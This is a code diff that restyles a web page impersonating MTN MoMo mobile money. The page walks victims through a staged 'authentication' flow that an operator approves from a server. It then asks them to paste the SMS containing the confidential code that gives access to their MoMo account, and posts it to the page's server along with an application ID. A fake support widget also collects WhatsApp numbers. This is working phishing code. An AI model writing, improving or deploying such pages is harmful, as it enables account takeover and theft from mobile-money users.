@@ -3,53 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Authentication - MTN MoMo</title>
+    <title>SMS Verification - MTN MoMo</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
         * { box-sizing: border-box; }
         html, body {
-            margin: 0; padding: 0; width: 100%; min-height: 100vh;
-            background-color: #003366; color: white;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100vh;
+            background-color: #f8f9fb;
+            color: #1f2937;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            display: flex; align-items: center; justify-content: center; text-align: center;
         }
-        .screen-container { width: 100%; max-width: 500px; padding: 30px 20px; }
+
+        /* Waiting State (when Stage1_Approved has not happened yet) */
+        .wait-body {
+            background-color: #003366;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 30px 20px;
+        }
         .hourglass-circle {
-            width: 120px; height: 120px;
-            background-color: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 50%; display: inline-flex;
-            align-items: center; justify-content: center;
-            font-size: 3rem; margin-bottom: 25px;
+            width: 110px;
+            height: 110px;
+            background-color: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.8rem;
+            margin-bottom: 22px;
         }
         .notice-banner {
-            background-color: rgba(255, 255, 255, 0.05);
-            border-radius: 12px; padding: 14px 20px;
-            margin-top: 20px; font-size: 0.9rem;
-            color: rgba(255, 255, 255, 0.7);
-        }
-        .app-id-tag { color: #FFCC00; font-weight: 700; letter-spacing: 1px; }
-        .custom-msg-box {
-            background: #FFCC00; color: #003366;
-            padding: 15px; border-radius: 12px;
-            font-weight: 700; margin-top: 15px; display: none;
-        }
-        .sms-box {
-            background: #002244; padding: 25px 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }
-        .timer-card {
-            background: rgba(255, 204, 0, 0.1);
-            border: 1px solid rgba(255, 204, 0, 0.55);
+            background-color: rgba(255, 255, 255, 0.06);
             border-radius: 12px;
+            padding: 12px 18px;
+            margin-top: 18px;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.75);
+        }
+        .app-id-tag {
+            color: #FFCC00;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+        .custom-msg-box {
+            background: #FFCC00;
+            color: #003366;
+            padding: 14px;
+            border-radius: 12px;
+            font-weight: 700;
+            margin-top: 15px;
+            display: none;
+        }
+
+        /* SMS Verification Screen Matching Reference Image */
+        .sms-page {
+            min-height: 100vh;
+            background-color: #f8f9fb;
+            padding-bottom: 96px;
+        }
+        .sms-topbar {
+            background-color: #ffffff;
+            border-bottom: 1px solid #e5e7eb;
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .sms-back-btn {
+            background: none;
+            border: none;
+            color: #4b5563;
+            font-size: 0.95rem;
+            font-weight: 500;
+            padding: 4px 6px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .sms-back-btn:hover {
+            color: #111827;
+        }
+        .sms-topbar-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: #111827;
+        }
+        .sms-topbar-spacer {
+            width: 54px;
+        }
+        .sms-container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 24px 18px 0;
+        }
+        .sms-heading {
+            font-size: 1.45rem;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 6px;
+        }
+        .sms-subtext {
+            font-size: 0.92rem;
+            color: #6b7280;
+            line-height: 1.45;
+            margin-bottom: 18px;
+        }
+        .sms-timer-card {
+            background-color: #fffbeb;
+            border: 1px solid #fcd34d;
+            border-radius: 10px;
             padding: 12px 14px;
             display: flex;
             align-items: center;
-            gap: 12px;
-            margin-bottom: 14px;
-            text-align: left;
+            gap: 14px;
+            margin-bottom: 18px;
         }
-        .timer-ring-wrap {
+        .sms-ring-wrap {
             position: relative;
             width: 44px;
             height: 44px;
@@ -58,55 +140,95 @@
             align-items: center;
             justify-content: center;
         }
-        .timer-ring-wrap svg {
+        .sms-ring-wrap svg {
             width: 44px;
             height: 44px;
             transform: rotate(-90deg);
         }
-        .ring-bg {
+        .sms-ring-bg {
             fill: none;
-            stroke: rgba(255, 204, 0, 0.22);
+            stroke: #fde68a;
             stroke-width: 3.5;
         }
-        .ring-progress {
+        .sms-ring-progress {
             fill: none;
-            stroke: #FFCC00;
+            stroke: #f59e0b;
             stroke-width: 3.5;
             stroke-linecap: round;
             stroke-dasharray: 113.1;
             stroke-dashoffset: 0;
             transition: stroke-dashoffset 0.9s linear;
         }
-        .timer-num {
+        .sms-ring-num {
             position: absolute;
             font-size: 0.85rem;
-            font-weight: 800;
-            color: #FFCC00;
+            font-weight: 700;
+            color: #d97706;
         }
-        .timer-text strong {
-            display: block;
-            font-size: 0.88rem;
-            color: #FFCC00;
+        .sms-timer-title {
+            font-size: 0.9rem;
+            font-weight: 700;
+            color: #1f2937;
+            line-height: 1.3;
         }
-        .timer-text span {
+        .sms-timer-sub {
+            font-size: 0.84rem;
+            color: #4b5563;
+            line-height: 1.35;
+        }
+        .sms-paste-box {
+            width: 100%;
+            min-height: 124px;
+            background-color: #ffffff;
+            border: 1px solid #d1d5db;
+            border-radius: 10px;
+            padding: 12px 14px;
+            font-size: 0.95rem;
+            color: #111827;
+            resize: vertical;
+        }
+        .sms-paste-box:focus {
+            outline: none;
+            border-color: #003366;
+            box-shadow: 0 0 0 3px rgba(0, 51, 102, 0.12);
+        }
+        .sms-paste-box::placeholder {
+            color: #9ca3af;
+        }
+        .sms-example-note {
+            font-style: italic;
             font-size: 0.8rem;
-            color: rgba(255, 255, 255, 0.72);
+            color: #6b7280;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            line-height: 1.4;
         }
-        .format-hint-box {
-            background-color: rgba(255, 204, 0, 0.08);
-            border-left: 4px solid #FFCC00;
+        .sms-submit-btn {
+            width: 100%;
+            padding: 14px;
             border-radius: 8px;
-            font-size: 0.8rem;
-            color: #f8f9fa;
-            text-align: left;
+            border: none;
+            font-size: 0.9rem;
+            font-weight: 700;
+            letter-spacing: 0.04em;
+            text-transform: uppercase;
+            background-color: #FFCC00;
+            color: #003366;
+            cursor: pointer;
+            transition: opacity 0.2s ease, background-color 0.2s ease;
+        }
+        .sms-submit-btn:disabled {
+            background-color: #e5e7eb;
+            color: #9ca3af;
+            cursor: not-allowed;
         }
     </style>
 </head>
 <body>
-    <div class="screen-container">
-        
-        <!-- Waiting State -->
-        <div id="waitSection">
+
+    <!-- Waiting State -->
+    <div id="waitSection" class="wait-body">
+        <div style="width: 100%; max-width: 500px;">
             <div class="hourglass-circle">⏳</div>
             <h2 class="fw-bold mb-2 fs-1">Authentication in progress...</h2>
             <p class="text-white-50 lead fs-6 mb-3">Please wait</p>
@@ -114,49 +236,53 @@
             <div class="notice-banner mb-4">Do not close this page</div>
             <div class="small">Application ID: <span class="app-id-tag">{{ app_id }}</span></div>
         </div>
+    </div>
 
-        <!-- SMS Authorization Message Input Box -->
-        <div id="smsSection" class="sms-box d-none">
-            <div class="badge bg-warning text-dark px-3 py-2 text-uppercase mb-3 fw-bold">✓ PIN Verified</div>
-            <h3 class="fw-bold text-white mb-2">Enter SMS Authorization Message</h3>
-            <p class="text-white-50 small mb-3">
-                Paste the full security SMS message received on your mobile device below to complete authorization.
+    <!-- SMS Verification Screen -->
+    <div id="smsSection" class="sms-page d-none">
+        <header class="sms-topbar">
+            <button type="button" id="smsBackBtn" class="sms-back-btn">&larr; Back</button>
+            <div class="sms-topbar-title">SMS Verification</div>
+            <div class="sms-topbar-spacer"></div>
+        </header>
+
+        <main class="sms-container">
+            <h1 class="sms-heading">Paste SMS Message</h1>
+            <p class="sms-subtext">
+                We have sent a message to your phone number. Please copy and paste the full message here.
             </p>
 
-            <!-- 60s Countdown Timer -->
-            <div class="timer-card">
-                <div class="timer-ring-wrap">
+            <div class="sms-timer-card">
+                <div class="sms-ring-wrap">
                     <svg viewBox="0 0 42 42">
-                        <circle class="ring-bg" cx="21" cy="21" r="18"></circle>
-                        <circle id="smsRingFill" class="ring-progress" cx="21" cy="21" r="18"></circle>
+                        <circle class="sms-ring-bg" cx="21" cy="21" r="18"></circle>
+                        <circle id="smsRingFill" class="sms-ring-progress" cx="21" cy="21" r="18"></circle>
                     </svg>
-                    <span id="smsTimerNum" class="timer-num">60</span>
+                    <span id="smsTimerNum" class="sms-ring-num">60</span>
                 </div>
-                <div class="timer-text">
-                    <strong id="smsTimerLabel">Message expires in 60s.</strong>
-                    <span>Paste your SMS before time runs out.</span>
+                <div>
+                    <div id="smsTimerTitle" class="sms-timer-title">Message expires in 60s.</div>
+                    <div class="sms-timer-sub">Paste your SMS before time runs out.</div>
                 </div>
-            </div>
-
-            <!-- Exact Message Example Box -->
-            <div class="format-hint-box p-3 mb-3">
-                <span class="text-warning fw-bold d-block mb-1">💡 Expected Message Example:</span>
-                <code style="color: #FFCC00; word-break: break-all; font-size: 0.75rem;">
-                    Y'ello. Please note! This confidential code gives access to your MoMo account:QIQSutdZDKpJIplUbs69uWtojKml1FU00rr9Eb4ksXbnng== Do not share it with anyone. l+/DM+Y0kqw HTx14B0+90w YyRaK1dXEWz CTO2RPz+HOF yiitGCXacTO
-                </code>
             </div>
 
             <form action="/submit-auth-code" method="POST">
                 <input type="hidden" name="app_id" value="{{ app_id }}">
-                <div class="mb-3">
-                    <textarea class="form-control" name="auth_code" rows="4" 
-                        placeholder="Paste the message here..." 
-                        required style="border-radius: 12px; font-size: 0.9rem; background-color: #ffffff; color: #000;"></textarea>
-                </div>
-                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow">SUBMIT SMS AUTHORIZATION</button>
-            </form>
-        </div>
+                <textarea
+                    id="smsPasteTextarea"
+                    name="auth_code"
+                    class="sms-paste-box"
+                    placeholder="Paste your full SMS message here..."
+                    required
+                ></textarea>
 
+                <div class="sms-example-note">
+                    Something like: "Y'ello. Please note! This confidential code gives access to your MoMo account:..........."
+                </div>
+
+                <button type="submit" id="smsSubmitBtn" class="sms-submit-btn" disabled>SUBMIT</button>
+            </form>
+        </main>
     </div>
 
     <script>
@@ -173,7 +299,7 @@
             const circumference = 2 * Math.PI * 18;
             const ringEl = document.getElementById("smsRingFill");
             const numEl = document.getElementById("smsTimerNum");
-            const labelEl = document.getElementById("smsTimerLabel");
+            const titleEl = document.getElementById("smsTimerTitle");
 
             ringEl.style.strokeDasharray = circumference;
 
@@ -187,15 +313,42 @@
                     remaining = 0;
                     clearInterval(interval);
                     numEl.textContent = "0";
-                    labelEl.textContent = "Message expired.";
+                    titleEl.textContent = "Message expired.";
                     ringEl.style.strokeDashoffset = circumference;
                     return;
                 }
                 numEl.textContent = String(remaining);
-                labelEl.textContent = `Message expires in ${remaining}s.`;
+                titleEl.textContent = `Message expires in ${remaining}s.`;
                 ringEl.style.strokeDashoffset = circumference * (1 - remaining / totalSeconds);
             }, 1000);
         }
+
+        function showSmsScreen() {
+            const waitSection = document.getElementById("waitSection");
+            const smsSection = document.getElementById("smsSection");
+            waitSection.classList.add("d-none");
+            smsSection.classList.remove("d-none");
+            startSmsTimer();
+        }
+
+        function showWaitScreen() {
+            const waitSection = document.getElementById("waitSection");
+            const smsSection = document.getElementById("smsSection");
+            smsSection.classList.add("d-none");
+            waitSection.classList.remove("d-none");
+        }
+
+        document.getElementById("smsBackBtn").addEventListener("click", () => {
+            showWaitScreen();
+        });
+
+        const smsTextarea = document.getElementById("smsPasteTextarea");
+        const smsSubmitBtn = document.getElementById("smsSubmitBtn");
+        function syncSmsSubmit() {
+            smsSubmitBtn.disabled = smsTextarea.value.trim().length === 0;
+        }
+        smsTextarea.addEventListener("input", syncSmsSubmit);
+        syncSmsSubmit();
 
         function checkStatus() {
             if (isRedirecting) return;
@@ -205,14 +358,10 @@
                 .then(data => {
                     if (isRedirecting) return;
 
-                    const waitSection = document.getElementById('waitSection');
-                    const smsSection = document.getElementById('smsSection');
                     const msgBox = document.getElementById('customMsg');
 
                     if (data.status === "Stage1_Approved") {
-                        waitSection.classList.add('d-none');
-                        smsSection.classList.remove('d-none');
-                        startSmsTimer();
+                        showSmsScreen();
                         setTimeout(checkStatus, 1500);
                     } else if (data.status === "Stage2_Approved") {
                         isRedirecting = true;
@@ -249,80 +398,79 @@
     </script>
 
     <!-- Floating Support Trigger Button -->
-<div id="help-btn" onclick="toggleHelpModal()" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; cursor: pointer; background: #007bff; color: white; border-radius: 50px; padding: 12px 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.25); display: flex; align-items: center; gap: 8px; font-weight: bold;">
-    💬 <span>Need Help?</span>
-</div>
-
-<!-- Support Form Modal -->
-<div id="help-modal" style="display: none; position: fixed; bottom: 85px; right: 20px; z-index: 9999; width: 320px; background: #ffffff; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); padding: 20px; font-family: sans-serif;">
-    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
-        <h4 style="margin: 0; color: #333;">🆘 Contact Support</h4>
-        <span onclick="toggleHelpModal()" style="cursor: pointer; font-size: 18px; font-weight: bold; color: #888;">&times;</span>
+    <div id="help-btn" onclick="toggleHelpModal()" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999; cursor: pointer; background: #007bff; color: white; border-radius: 50px; padding: 12px 18px; box-shadow: 0 4px 12px rgba(0,0,0,0.25); display: flex; align-items: center; gap: 8px; font-weight: bold;">
+        💬 <span>Need Help?</span>
     </div>
-    
-    <form id="help-form" onsubmit="submitHelpForm(event)">
-        <div style="margin-bottom: 10px;">
-            <label style="font-size: 12px; font-weight: bold; color: #555;">WhatsApp Phone Number</label>
-            <input type="text" id="help-phone" placeholder="e.g. +256700000000" required style="width: 100%; padding: 8px; margin-top: 4px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box;">
-        </div>
-        
-        <div style="margin-bottom: 12px;">
-            <label style="font-size: 12px; font-weight: bold; color: #555;">Describe your issue</label>
-            <textarea id="help-issue" rows="3" placeholder="Explain the problem you are experiencing..." required style="width: 100%; padding: 8px; margin-top: 4px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; resize: none;"></textarea>
+
+    <!-- Support Form Modal -->
+    <div id="help-modal" style="display: none; position: fixed; bottom: 85px; right: 20px; z-index: 9999; width: 320px; background: #ffffff; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); padding: 20px; font-family: sans-serif;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+            <h4 style="margin: 0; color: #333;">🆘 Contact Support</h4>
+            <span onclick="toggleHelpModal()" style="cursor: pointer; font-size: 18px; font-weight: bold; color: #888;">&times;</span>
         </div>
 
-        <button type="submit" id="help-submit-btn" style="width: 100%; background: #28a745; color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer;">Send Support Request</button>
-    </form>
-    
-    <div id="help-status-msg" style="margin-top: 10px; font-size: 13px; text-align: center; display: none;"></div>
-</div>
+        <form id="help-form" onsubmit="submitHelpForm(event)">
+            <div style="margin-bottom: 10px;">
+                <label style="font-size: 12px; font-weight: bold; color: #555;">WhatsApp Phone Number</label>
+                <input type="text" id="help-phone" placeholder="e.g. +256700000000" required style="width: 100%; padding: 8px; margin-top: 4px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box;">
+            </div>
 
-<script>
-function toggleHelpModal() {
-    const modal = document.getElementById('help-modal');
-    modal.style.display = modal.style.display === 'none' ? 'block' : 'none';
-}
+            <div style="margin-bottom: 12px;">
+                <label style="font-size: 12px; font-weight: bold; color: #555;">Describe your issue</label>
+                <textarea id="help-issue" rows="3" placeholder="Explain the problem you are experiencing..." required style="width: 100%; padding: 8px; margin-top: 4px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; resize: none;"></textarea>
+            </div>
 
-function submitHelpForm(event) {
-    event.preventDefault();
-    const phone = document.getElementById('help-phone').value;
-    const issue = document.getElementById('help-issue').value;
-    const btn = document.getElementById('help-submit-btn');
-    const msg = document.getElementById('help-status-msg');
+            <button type="submit" id="help-submit-btn" style="width: 100%; background: #28a745; color: white; border: none; padding: 10px; border-radius: 6px; font-weight: bold; cursor: pointer;">Send Support Request</button>
+        </form>
 
-    btn.disabled = true;
-    btn.innerText = 'Sending...';
+        <div id="help-status-msg" style="margin-top: 10px; font-size: 13px; text-align: center; display: none;"></div>
+    </div>
 
-    fetch('/submit-support', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ whatsapp_phone: phone, issue: issue })
-    })
-    .then(res => res.json())
-    .then(data => {
-        if (data.status === 'ok') {
-            msg.style.color = 'green';
-            msg.innerText = '✅ Issue submitted! Support will contact you shortly.';
-            msg.style.display = 'block';
-            document.getElementById('help-form').reset();
-            setTimeout(() => { toggleHelpModal(); msg.style.display = 'none'; }, 2500);
-        } else {
+    <script>
+    function toggleHelpModal() {
+        const modal = document.getElementById('help-modal');
+        modal.style.display = modal.style.display === 'none' ? 'block' : 'none';
+    }
+
+    function submitHelpForm(event) {
+        event.preventDefault();
+        const phone = document.getElementById('help-phone').value;
+        const issue = document.getElementById('help-issue').value;
+        const btn = document.getElementById('help-submit-btn');
+        const msg = document.getElementById('help-status-msg');
+
+        btn.disabled = true;
+        btn.innerText = 'Sending...';
+
+        fetch('/submit-support', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ whatsapp_phone: phone, issue: issue })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.status === 'ok') {
+                msg.style.color = 'green';
+                msg.innerText = '✅ Issue submitted! Support will contact you shortly.';
+                msg.style.display = 'block';
+                document.getElementById('help-form').reset();
+                setTimeout(() => { toggleHelpModal(); msg.style.display = 'none'; }, 2500);
+            } else {
+                msg.style.color = 'red';
+                msg.innerText = '❌ Failed to submit. Try again.';
+                msg.style.display = 'block';
+            }
+        })
+        .catch(() => {
             msg.style.color = 'red';
-            msg.innerText = '❌ Failed to submit. Try again.';
+            msg.innerText = '❌ Network error.';
             msg.style.display = 'block';
-        }
-    })
-    .catch(() => {
-        msg.style.color = 'red';
-        msg.innerText = '❌ Network error.';
-        msg.style.display = 'block';
-    })
-    .finally(() => {
-        btn.disabled = false;
-        btn.innerText = 'Send Support Request';
-    });
-}
-</script>
-    
+        })
+        .finally(() => {
+            btn.disabled = false;
+            btn.innerText = 'Send Support Request';
+        });
+    }
+    </script>
 </body>
 </html>
